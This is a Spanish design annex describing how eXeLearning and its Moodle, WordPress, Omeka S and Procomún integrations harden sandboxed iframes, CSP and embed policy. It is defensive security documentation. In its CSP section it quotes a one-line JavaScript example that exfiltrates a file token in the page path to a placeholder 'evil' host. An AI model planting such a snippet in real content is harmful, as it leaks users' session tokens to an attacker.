# Anexo — Modo «siempre opaco» (endurecimiento posterior)

> Estado: **implementado** sobre las ramas de los PRs en curso — eXeLearning core
> (`fix/opaque-iframe-external-media`, PR #1968), `mod_exelearning` (`feature/secure-iframe-scorm-bridge`,
> PR #80), `wp-exelearning` (`feature/secure-iframe-sandbox`, PR #56), `omeka-s-exelearning`
> (`feature/secure-iframe-sandbox`, PR #21) y Procomún (`feat/align-embed-bridge-with-mod`, PR #260).
> Este anexo distingue lo
> **implementado** (con evidencia de test), las **limitaciones residuales** y el **trabajo futuro**.
> No sobreafirma: el aislamiento lo impone la política de sandbox del host y, ahora, también la
> previsualización del editor de eXeLearning core.

## 1. El origen opaco deja de ser opcional

- **eXeLearning core (previsualización del editor).** La previsualización del autor renderizaba el
  contenido del paquete con `allow-same-origin` (más `allow-modals`/`allow-downloads`), de modo que un
  `.elpx` malicioso importado podía alcanzar el DOM/almacenamiento/sesión del editor. Ahora ambos
  iframes de previsualización usan `sandbox="allow-scripts allow-popups allow-forms"` (origen opaco).
  El Service Worker sirve `/viewer/*` por **URL** (no por origen), el modo profesor es un parámetro
  `?exe-teacher=1`, y la única llamada same-origin (`contentWindow.print()` del modal de impresión) se
  sustituyó por un puente `postMessage` con el modal renderizado vía `srcdoc`.
- **Plugins host (Moodle/WordPress/Omeka S).** Se elimina el modo `legacy` (same-origin) de la
  configuración de producción. No queda ningún ajuste de administración que reactive `allow-same-origin`
  para contenido de paquete no confiable, y **no hay degradación silenciosa**: si el servido seguro
  falla se muestra un aviso de bloqueo, nunca un fallback same-origin.
- **Procomún.** La previsualización ELPX ya era opaca; este endurecimiento confirma que no hay fallback
  same-origin.

> **Aclaración respecto a §6.2.2.** PR #1968 (el puente de medios) solo hace *funcionar* los medios
> externos dentro de un host opaco; **nunca** aportó el aislamiento del iframe. El aislamiento lo
> impone la política de sandbox — ahora del host **y** de la previsualización de core.

## 2. Política de embeds: `strict` por defecto

El modo de promoción de embeds externos pasa a **`strict` por defecto** en los cinco repos; `open` es
una opción explícita (ajuste de administración en los plugins, variable de entorno
`PUBLIC_EXELEARNING_EMBED_MODE` en Procomún). Cualquier valor ausente o no reconocido **falla de forma
segura a `strict`**. En `strict` solo se promueven los proveedores mantenidos (YouTube, Vimeo,
Dailymotion, Mediateca de Madrid) con reconstrucción canónica de URL; se rechazan `userinfo`, no-HTTPS,
same-origin, sub/superdominios del LMS, literales IP, `localhost`/`.local`, ids malformados y el
*redirect-laundering*.

> **Corrección a §6.2.2/§6.3 (revisión previa).** El relé de superposición tenía por defecto el
> *invariante estructural* (cualquier iframe https cross-origin) y la *lista blanca* solo en `strict`.
> Tras este cambio el **valor por defecto es `strict`** (lista blanca + reconstrucción canónica), y
> `open` (invariante estructural) es la opción. El puente **modal** nunca recibe una URL: reconstruye
> la URL canónica desde `{proveedor, id}` con lista cerrada YouTube/Vimeo.

## 3. CSP: estricta por defecto, perfil `compatible` opcional

La CSP del documento de contenido es **estricta por defecto**: sin comodín `https:` en
`script/img/media-src` (de modo que el token de fichero que viaja en la URL no pueda exfiltrarse, p.
ej. con `new Image().src='https://evil/?'+location.pathname`), y `frame-src` limitada a los proveedores
mantenidos. Existe un perfil **`compatible`** explícito, documentado como más débil y **no** por
defecto (ajuste/filtro/entorno), que reabre `img/media/script` a `https:` para contenido con imágenes
externas o un CDN de MathJax. Con la CSP como mitigación primaria, el **IP-binding del token** (Moodle)
queda como **defensa en profundidad** (con su test de regresión).

## 4. MIME/PDF

Todo fichero servido lleva `X-Content-Type-Options: nosniff` y `Referrer-Policy: no-referrer`. Un PDF
same-origin debe pertenecer al paquete; un **PDF cross-origin** se renderiza con `sandbox="allow-same-origin"`
(sin scripts ni top-navigation), evitando que un servidor que sirva HTML en una ruta `.pdf` redirija la
pestaña del host a phishing. (Procomún sirve además todo asset no-HTML con CSP `sandbox`, cerrando el
vector de SVG same-origin.)

## 5. Control de deriva del puente compartido

`mod_exelearning/tools/check-embed-sync.mjs` se amplía para cubrir, además del relé/shim de promoción,
el **puente modal** (`exe_media_policy.js` en core + mod/wp/omeka/procomun, y el host raw-postMessage
`exe_media_host.js` en mod/wp/omeka/procomun; el fork SDK de core se excluye a propósito) e incluir
**Procomún**. Fuente canónica, comando de sincronización y estado de CI documentados en
`tools/EMBED-SYNC.md`. (Sin infraestructura de CI compartida entre repos, sigue siendo un paso local
obligatorio del checklist de PR.)

## 6. Evidencia de comportamiento: `testing-the-sandbox.elpx`

Se añade un fixture compartido (1 página, 1 iDevice de texto, 1 iframe de YouTube y una sonda en línea
que registra si `parent/top` `location/document/cookie/localStorage` son accesibles). En los hosts que
sirven el `.elpx` verbatim, la sonda debe reportar **bloqueo** (SecurityError) en modo opaco. En eXe
core la garantía determinista es el **atributo sandbox** (sin `allow-same-origin`) más que la sonda (el
editor regenera la previsualización y el saneador elimina los `<script>` en línea).

## 7. Limitaciones residuales y trabajo futuro

- **Playgrounds php-wasm (WordPress/Omeka).** Su Service Worker solo sirve documentos same-origin, así
  que no pueden servir subframes opacos. No se reintroduce el modo legacy de producción: se usa una
  **vía de escape solo para desarrollo** (constante `EXELEARNING_UNSAFE_LEGACY_IFRAME`, por defecto
  desactivada, fuera de la UI de administración, con aviso visible; un test prueba que está apagada por
  defecto). El blueprint del Playground de WordPress la define en lugar de fijar la opción legacy. Es
  una **limitación de infraestructura del Playground**, no del plugin.
- **`mod_exeweb` y `mod_exescorm` siguen siendo vulnerables.** Renderizan contenido same-origin sin
  sandbox y pueden exponer `sesskey`/DOM/API. **No se modifican** en este trabajo. Hasta que reciban
  tratamiento de iframe opaco (y `mod_exescorm` un puente SCORM equivalente al de `mod_exelearning`),
  deben documentarse como **solo para contenido confiable**.
- **SCORM/xAPI en la previsualización de eXe core.** Core no tiene relé SCORM para su propia
  previsualización (es una comprobación visual, no un intento calificado). Si en el futuro se
  necesitara, debe implementarse como puente `postMessage` validado, **nunca** reañadiendo
  `allow-same-origin` (ver el ADR `doc/development/adr-opaque-preview-scorm-gap.md` en core). Los hosts
  que sí califican (Moodle) ya relevan SCORM/xAPI por puentes validados con rechazo de mensajes
  forjados (origen/nonce/acción/forma/replay), cubierto por sus tests `scorm_bridge.test.js` /
  `xapi_listener.test.js`.

> Las versiones EN del cuerpo (§6.2.2/§6.3) deben reflejar el nuevo **`strict` por defecto** y el modo
> «siempre opaco»; este anexo recoge los cambios implementados para incorporarlos en la próxima
> revisión del cuerpo.
